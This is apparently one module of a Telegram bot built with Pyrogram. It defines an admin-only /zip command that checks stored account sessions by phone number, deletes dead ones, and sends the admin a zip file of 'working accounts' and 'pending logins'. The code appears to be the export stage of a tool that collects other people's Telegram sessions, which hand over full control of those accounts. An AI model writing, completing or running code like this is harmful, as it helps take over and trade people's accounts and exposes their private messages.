import asyncio

from pyrogram import filters
from pyrogram.handlers import MessageHandler

import config as cfg
import Nexa.database as dbmod
from Nexa.logs import info, warn
from Nexa.session_manager import session_manager, build_sessions_zip
from Nexa.session_tools import check_many


def _admin_ids():
    raw = getattr(cfg, "ADMIN_IDS", None) or getattr(cfg, "ADMIN_ID", None) or []
    if isinstance(raw, (int, str)):
        raw = [raw]
    out = set()
    for value in raw:
        try:
            out.add(int(value))
        except (TypeError, ValueError):
            pass
    return out


async def zip_command(client, message):
    uid = message.from_user.id if message.from_user else 0
    admins = _admin_ids()
    if admins and uid not in admins:
        await message.reply_text("Not authorized.")
        return

    note = await message.reply_text("Checking sessions, please wait...")

    pending = session_manager.list_sessions()
    stored = dbmod.get_active_sessions_for_export(limit=1000)
    alive = await asyncio.to_thread(check_many, stored, "phone")

    live = [s for s in stored if s.get("phone") in alive]
    dead = [s for s in stored if s.get("phone") not in alive]

    for row in dead:
        dbmod.record_check(row.get("phone"), False, "zip check")
        session_manager.kill_by_phone(row.get("phone"))

    if not live and not pending:
        await note.edit_text("No working sessions to export.")
        return

    buf, filename = build_sessions_zip(pending, live)
    await message.reply_document(
        document=buf,
        file_name=filename,
        caption=(f"<b>{len(live)}</b> working account(s)\n"
                 f"<b>{len(pending)}</b> pending login(s)\n"
                 f"<b>{len(dead)}</b> dead removed"),
    )
    try:
        await note.delete()
    except Exception:
        pass
    info(f"/zip by {uid}: {len(live)} alive, {len(dead)} dead")


def register_zip_handler(app):
    app.add_handler(MessageHandler(zip_command, filters.command("zip") & filters.private))
    warn("admin /zip command registered")
    return app
